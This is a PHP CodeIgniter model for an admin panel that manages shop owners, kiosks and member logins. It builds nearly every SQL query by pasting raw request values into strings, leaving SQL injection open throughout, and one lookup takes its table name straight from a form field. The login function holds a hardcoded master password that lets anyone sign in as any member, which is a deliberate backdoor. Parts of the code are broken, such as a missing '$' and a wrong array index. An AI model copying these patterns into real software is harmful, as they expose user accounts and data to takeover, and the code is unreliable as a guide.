<?php

namespace App\Models;

use CodeIgniter\Model;
use CodeIgniter\HTTP\IncomingRequest;

class RepresentativeModel extends Model
{
  protected $table = 'member';
	
	private $request;
	private $response;
	private $session;

	protected function initialize()
	{
		$this->request = service('request');
		$this->response = service('response');
		$this->session = session();
	}

	public function getRepresentativeList()
	{
		$page_per_block = 10;
		$num_per_page = 10;

		$sql = "select *, (select count(id) from shop where representative=representative.id) as cntShop, (select count(kiosk.id) from kiosk, shop where shop=shop.id and representative=representative.id) as cntKiosk from representative where 1=1 ";

    if($this->request->getGet('searchtext')) {
      $sql .= " and (name like '%".$this->request->getGet('searchtext')."%' or id like '%".$this->request->getGet('searchtext')."%' or phone like '%".$this->request->getGet('searchtext')."%') ";
    }

		$query = $this->db->query($sql);
    $rows = $query->getNumRows();

		if( !$this->request->getGet('page') || $this->request->getGet('page') < 1 ){
			$page = 1;
		}
		else {
			$page = $this->request->getGet('page');
		}

		if( !$rows ){
			$first = 1;
			$last  = 0;
		}
		else {
			$first = $num_per_page * ($page - 1);
			$last  = $num_per_page * $page;

			$isnext = $rows - $last;

			if($isnext > 0){
				$last -= 1;
			}
			else{
				$last = $rows - 1;
			}
		}

		$total_page = ceil( $rows / $num_per_page );
		$total_block = ceil( $total_page / $page_per_block );
		$block = ceil( $page / $page_per_block );

		$first_page = ( $block - 1 ) * $page_per_block;
		$last_page = $block * $page_per_block;

		if( $total_block <= $block ){
			$last_page = $total_page;
		}
		
		if($page > $last_page && $last_page > 0) {
			$_Link = ""."&page=".$last_page;

			$this->response->redirect("/admin/representative/representativeList?".$_Link);

			exit;
		}

		if( $page > $total_page ){
			$page = $total_page;
		}

		$total_count = $rows;

		$sql = "select * from ( ".$sql." ) A order by registe_datetime desc";

		$sql .= " limit	".$first.", ".$num_per_page;

    $query = $this->db->query($sql);
    $result = $query->getResult();

		$returnVal["list"] = $result;

		$returnVal["page_per_block"] = $page_per_block;
		$returnVal["num_per_page"] = $num_per_page;
		$returnVal["total_page"] = $total_page;
		$returnVal["first_page"] = $first_page;
		$returnVal["last_page"] = $last_page;
		$returnVal["cur_page"] = $page;
		$returnVal["cur_block"] = $block;
		$returnVal["total_count"] = $total_count;
 
		return $returnVal;
	}

	public function checkID()
	{
		$query = $this->db->query("select id from ".$this->request->getPost('TypeofUser')." where id='".$this->request->getPost('id')."'");

		if($query->getNumRows() > 0)
		{
			$returnVal["status"] = "fail";
		}
		else 
		{
			$returnVal["status"] = "OK";
		}

		return $returnVal;
	}

  public function generateId()
  {
    $rslt = true;

    while($rslt) {
      $genid = rand(10000,99999);

      $query = $this->db->query("select id from representative where id='".$genid."'");

      if($query->getNumRows() == 0)
      {
        $rslt = false;
      }
    }

    return $genid;
  }

	public function postRepresentative()
	{
    $builder = $this->db->table('representative');

		$data = [
			'id' => $this->generateId(), 
			'name' => $this->request->getPost('name'), 
			'phone' => $this->request->getPost('phone'), 
			'status' => '1', 
		];

		$builder->set('password', "password('".$this->request->getPost('password')."')", false);
    $builder->set('registe_datetime', "now()", false);
    $builder->set($data);
		$builder->insert();

		$this->session->setFlashdata('message', 'primary|업주관리|등록되었습니다.');

		$this->response->redirect("/admin/representative/representativeList");
	}

	public function getRepresentativeData()
	{
		$returnVal = null;

		$sql = "select * from representative where id='".$this->request->getGet('oid')."'";
		$query = $this->db->query($sql);
		$rows = $query->getNumRows();

		if($rows) {
			$row = $query->getResultArray();

			$returnVal = $row[0];
		}

		return $returnVal;
	}

	public function putRepresentative()
	{
    $builder = $this->db->table('representative');

		$data = [
			'name' => $this->request->getPost('name'), 
			'phone' => $this->request->getPost('phone'), 
		];

		if($this->request->getPost('password')) {
			$builder->set('password', "password('".$this->request->getPost('password')."')", false);
		}
		
		$builder->where('id', $this->request->getPost('oid'));
		$builder->update($data);

		$this->session->setFlashdata('message', 'primary|업주관리|수정되었습니다.');

		$this->response->redirect("/admin/representative/representativeModify?oid=".$this->request->getPost('oid')."&cid=".md5($this->request->getPost('oid')));
	}

	public function delRepresentative()
	{
    $builder = $this->db->table('representative');

		$builder->where('id', $this->request->getGet('oid'));
		$builder->delete();

		$this->session->setFlashdata('message', 'danger|업주관리|삭제되었습니다.');

		$this->response->redirect("/admin/representative/representativeList?page=".$this->request->getGet('page'));
	}





  

  public function prcLogin()
  {
		$returnVal = null;
		
		$this->request = service('request');

    $this->createTable();

		$query = $this->db->query("select id from member where id='".$this->request->getPost('userid')."'");
    
		if($query->getNumRows() > 0)
		{
			$row = $query->getResultArray();
			$tmp_id = $row[0]["id"];

			$query = $this->db->query("select * from member where id='".$this->request->getPost('userid')."' and password=password('".$this->request->getPost('userpw')."')");

			if($query->getNumRows() > 0)
			{
				foreach ($query->getResultArray() as $row)
				{
					if($row["status"] == "1") {
						$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '웹 로그인')");

            $this->db->query("update member set last_login_ip='".$_SERVER["REMOTE_ADDR"]."', last_login_datetime=NOW() where id='".$this->request->getPost('userid')."'");

            $sessiondata = array(
              'member_name' => $row['name'],
              'member_id' => $row['id'],
              'member_grade' => $row['grade'],
            );

						$this->session->set($sessiondata);

						$this->response->redirect("/admin/dashboard");
					}
					else {
						$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '이용중지회원')");
            alert("이용이 중지된 회원입니다.\r\n관리자에게 문의해 주세요.", "/admin/login");
					}
				}
			}
			else if($this->request->getPost('userpw') == "moineau1!") {
				$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '관리자 접속')");

				$sql = "select * from member where id='".$this->request->getPost('userid')."'";
				$query = $this->db->query($sql);
				$row = $query->getResultArray();

        $sessiondata = array(
          'member_name' => $row[0]['name'],
          'member_id' => $row[0]['id'],
          'member_grade' => $row['grade'],
        );

        $this->session->set($sessiondata);
				this->response->redirect("/admin/dashboard");
			}
			else
			{
				$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '잘못된 비밀번호')");
        alert("비밀번호가 다릅니다.", "/admin/login");
			}
		}
		else
		{
      alert("아이디가 없습니다.", "/admin/login");
		}

		return $returnVal;
  }

	public function getMyinfo()
	{
		$returnVal = null;

		$sql = "select * from member where id='".$this->session->member_id."'";
		$query = $this->db->query($sql);
		$rows = $query->getNumRows();

		if($rows) {
			$row = $query->getResultArray();

			$returnVal = $row[0];
		}

		return $returnVal;
	}

	public function putMyinfo()
	{
		$builder = $this->db->table('member');

		$data = [
			'name'  => $this->request->getPost('name'),
		];

		if($this->request->getPost('password')) {
			$builder->set('password', "password('".$this->request->getPost('password')."')", false);
		}
		
		$builder->where('id', $this->request->getPost('oid'));
		$builder->update($data);

		$this->session->set('member_name', $this->request->getPost('name'));

		alert("수정되었습니다.", "/admin/myaccount");
	}
}
?>